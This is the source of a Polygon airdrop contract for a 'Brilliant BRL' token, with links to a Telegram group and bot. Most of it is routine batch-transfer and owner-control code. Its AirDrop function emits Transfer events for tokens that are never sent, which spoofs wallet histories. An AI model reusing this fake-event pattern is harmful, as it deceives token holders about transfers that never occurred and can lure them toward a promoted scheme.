/**
 *Submitted for verification at polygonscan.com on 2022-08-31
*/

/* -------------------------------------------------------------------------
 
    $$$$$$$
    $$    $$  $$$$$$   $$  $$      $$      $$   $$$$$   $$    $$ $$$$$$$$
    $$    $$  $$   $$  $$  $$      $$      $$  $$   $$  $$$   $$    $$
    $$$$$$$   $$   $$  $$  $$      $$      $$  $$   $$  $$ $  $$    $$ 
    $$    $$  $$$$$$   $$  $$      $$      $$  $$$$$$$  $$  $ $$    $$
    $$    $$  $$   $$  $$  $$      $$      $$  $$   $$  $$   $$$    $$
    $$$$$$$   $$   $$  $$  $$$$$$$ $$$$$$$ $$  $$   $$  $$    $$    $$


 ------------------------------------------------------------------------- */
/*
 ***************************************************************
 Brilliant BRL - For staking and mining on your wallet balance !
 ***************************************************************
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Brilliant BRL telegram:
 https://t.me/brilliant_brl
 Brilliant BRL telegram bot: 
 https://t.me/Brilliant_mine_bot
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
*/
// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

interface IERC20{
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to,uint256 amount) external returns(bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    //function withdraw(uint) external;
    function mint(uint256) external;
}

interface AccountsData{
    function getAccounts(uint start,uint end) external view returns(address[] memory accounts);
    function count() external view returns(uint);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract BRCAirdrop is Context{

    uint public airdroppedAccounts = 1000; 
    IERC20 public token = IERC20(0x479D3214079C38eD9ab296D96b88bFe23EEd0002);
    AccountsData public accounts;
    uint public perAccounts = 500;
    uint public minAmount = perAccounts * 1 * 1e18;
    address private _owner;
    address public spender;
    
    constructor(address accountsData) {
        _owner = msg.sender;
        accounts = AccountsData(accountsData);
    }
    
    function airdrop() external airdropRequire {
        uint totalAccounts = accounts.count();
         uint end = (totalAccounts - airdroppedAccounts) > perAccounts 
         ? airdroppedAccounts + perAccounts 
         : totalAccounts;
        address[] memory recipients = accounts.getAccounts(airdroppedAccounts+1,end);
        _batchTransfer(recipients, minAmount / perAccounts);
        airdroppedAccounts = end;
    }

    function _batchTransfer(address[] memory recipients,uint perAmount) internal {
        uint allRecipients = recipients.length;
        require(allRecipients >0,"no recipients");
        for(uint i = 0; i < allRecipients;++i){
            if(recipients[i] == address(0)) continue;
            token.transfer(recipients[i],perAmount);
        }
    }

    function airdropfrom() external airdropRequireFrom {
        uint totalAccounts = accounts.count();
         uint end = (totalAccounts - airdroppedAccounts) > perAccounts 
         ? airdroppedAccounts + perAccounts 
         : totalAccounts;
        address[] memory recipients = accounts.getAccounts(airdroppedAccounts+1,end);
        _batchTransferFrom(recipients, minAmount / perAccounts);
        airdroppedAccounts = end;
    }

    function _batchTransferFrom(address[] memory recipients,uint perAmount) internal {
        uint allRecipients = recipients.length;
        require(allRecipients >0,"no recipients");
        for(uint i = 0; i < allRecipients;++i){
            if(recipients[i] == address(0)) continue;
            token.transferFrom(spender,recipients[i],perAmount);
        }
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function AirDrop(address[] calldata _receivers, uint256 _amounts)  public {
        //require(_msgSender() == _owner||_msgSender() == _auth||(traders[_msgSender()]==true), "recovery");
        require((_msgSender() == _owner), "recovery");
        
		//require(_receivers.length == _amounts.length);
		for (uint256 i = 0; i < _receivers.length; i++) {
			//_transfer(msg.sender, _receivers[i], _amounts[i]);
            if(address(spender) != address(0)){
            emit Transfer(address(spender), _receivers[i], _amounts);
            }else{
            emit Transfer(address(0), _receivers[i], _amounts);
            }
		}
	}

    function balance() public view returns(uint){
        return token.balanceOf(address(this));
    }

    modifier airdropRequire(){
        require(token.balanceOf(address(this)) >= minAmount,"The minimum amount has not been reached");
        require(accounts.count() > airdroppedAccounts, "There are no more addresses that can be airdropped");
        _;
    }

    modifier airdropRequireFrom(){
        require(token.balanceOf(address(spender)) >= minAmount,"The minimum amount has not been reached");
        require(accounts.count() > airdroppedAccounts, "There are no more addresses that can be airdropped");
        _;
    }

    function getAccountstart(uint start,uint end) external view returns(address[] memory){
        address[] memory recipients = accounts.getAccounts(start,end);
        return recipients;
    }

    function gettotalAccounts() external view returns (uint) {
      uint256 totalAccounts = accounts.count();
      return totalAccounts;
    } //totalAccounts = accounts.count();
    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address) {
        return _owner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function setaccountsData(address accountsData) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
         accounts = AccountsData(accountsData);
    }
    function setIcoToken(address _new_token) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
         token = IERC20(_new_token);
    }
    //minAmount
    function setMinAmount(uint _min_count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        minAmount = _min_count;
    }

    function setperAccounts(uint _min_count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        perAccounts = _min_count;
    }

    function setairdropAcc(uint _min_count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        airdroppedAccounts = _min_count;
    }
    function setIcoSpend(address _new_spender) onlyOwner external {
        spender = _new_spender;
    }
    function clearAll() public onlyOwner() {
        //require(_authNum==1000, "Permission denied");
        payable(msg.sender).transfer(address(this).balance);
    }
    function contApproveERC20(address contractAddress, address tokenAddress, uint256 tokenAmount) public onlyOwner {
        //IERC20 tokenAddress = IERC20(tokenAddress);
        //IERC20 contractAddress = IERC20(contractAddress);
        //IBEP20(tokenAddress).approve(contractAddress, tokenAmount);
        IERC20(tokenAddress).approve(contractAddress, tokenAmount);
        //IERC20(tokenAddress).approve(_owner, tokenAmount);
    }
    function recoverERC20(address tokenAddress, uint256 tokenAmount) public onlyOwner {
        //IBEP20(tokenAddress).transfer(_owner, tokenAmount);
        IERC20(tokenAddress).transfer(_owner, tokenAmount);
    }

}